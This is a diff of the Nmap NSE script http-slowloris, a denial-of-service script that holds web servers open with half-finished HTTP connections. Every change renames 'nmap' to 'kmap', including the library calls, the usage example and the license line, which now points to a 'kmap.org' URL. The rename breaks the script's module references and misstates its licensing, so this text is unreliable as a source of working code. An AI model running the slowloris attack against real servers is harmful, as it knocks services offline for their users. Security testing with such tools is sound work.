@@ -1,7 +1,7 @@
 local coroutine = require "coroutine"
 local datetime = require "datetime"
 local math = require "math"
-local nmap = require "nmap"
+local kmap = require "kmap"
 local os = require "os"
 local shortport = require "shortport"
 local stdnse = require "stdnse"
@@ -36,7 +36,7 @@ when run from Windows.
 
 ---
 -- @usage
--- nmap --script http-slowloris --max-parallelism 400  <target>
+-- kmap --script http-slowloris --max-parallelism 400  <target>
 --
 -- @args http-slowloris.runforever Specify that the script should continue the
 -- attack forever. Defaults to false.
@@ -57,7 +57,7 @@ when run from Windows.
 -- @see http-slowloris-check.nse
 
 author = {"Aleksandar Nikolic", "Ange Gutek"}
-license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
+license = "Same as Kmap--See https://kmap.org/book/man-legal.html"
 categories = {"dos", "intrusive"}
 
 
@@ -85,7 +85,7 @@ local Bestopt
 
 
 local function timeout_occured()
-  if nmap.clock_ms() < end_time or TimeLimit == nil then
+  if kmap.clock_ms() < end_time or TimeLimit == nil then
     return false
   else
     StopAll = true
@@ -98,12 +98,12 @@ local function get_end_time()
   if TimeLimit == nil then
     return -1
   end
-  return 1000 * TimeLimit + nmap.clock_ms()
+  return 1000 * TimeLimit + kmap.clock_ms()
 end
 
 -- set Time interval for threads to sleep
 local function set_SendInterval()
-  SendInterval = math.min(SendInterval, (end_time - nmap.clock_ms())/1000)
+  SendInterval = math.min(SendInterval, (end_time - kmap.clock_ms())/1000)
 end
 
 local function set_parameters()
@@ -116,7 +116,7 @@ local function set_parameters()
 end
 
 local function do_half_http(host, port, obj)
-  local condvar = nmap.condvar(obj)
+  local condvar = kmap.condvar(obj)
 
   if timeout_occured() then
     condvar("signal")
@@ -124,8 +124,8 @@ local function do_half_http(host, port, obj)
   end
 
   -- Create socket
-  local slowloris = nmap.new_socket()
-  slowloris:set_timeout(math.min(200 * 1000, end_time - nmap.clock_ms())) -- Set a long timeout so our socket doesn't timeout while it's waiting. At the same time left for script execution is maximum limit.
+  local slowloris = kmap.new_socket()
+  slowloris:set_timeout(math.min(200 * 1000, end_time - kmap.clock_ms())) -- Set a long timeout so our socket doesn't timeout while it's waiting. At the same time left for script execution is maximum limit.
 
   ThreadCount = ThreadCount + 1
   local catch = function()
@@ -138,7 +138,7 @@ local function do_half_http(host, port, obj)
     return
   end
 
-  local try = nmap.new_try(catch)
+  local try = kmap.new_try(catch)
   try(slowloris:connect(host.ip, port, Bestopt))
 
   if timeout_occured() then
@@ -209,7 +209,7 @@ local function do_monitor(host, port)
   if sd then sd:close() end
 
   while not StopAll do
-    local monitor = nmap.new_socket()
+    local monitor = kmap.new_socket()
     local status  = monitor:connect(host.ip, port, Bestopt)
     if not status then
       general_faults = general_faults + 1
@@ -255,12 +255,12 @@ local function do_monitor(host, port)
   end
 end
 
-local Mutex = nmap.mutex("http-slowloris")
+local Mutex = kmap.mutex("http-slowloris")
 
 local function worker_scheduler(host, port)
   local Threads = {}
   local obj = {}
-  local condvar = nmap.condvar(obj)
+  local condvar = kmap.condvar(obj)
   local i
 
   for i = 1, 1000 do
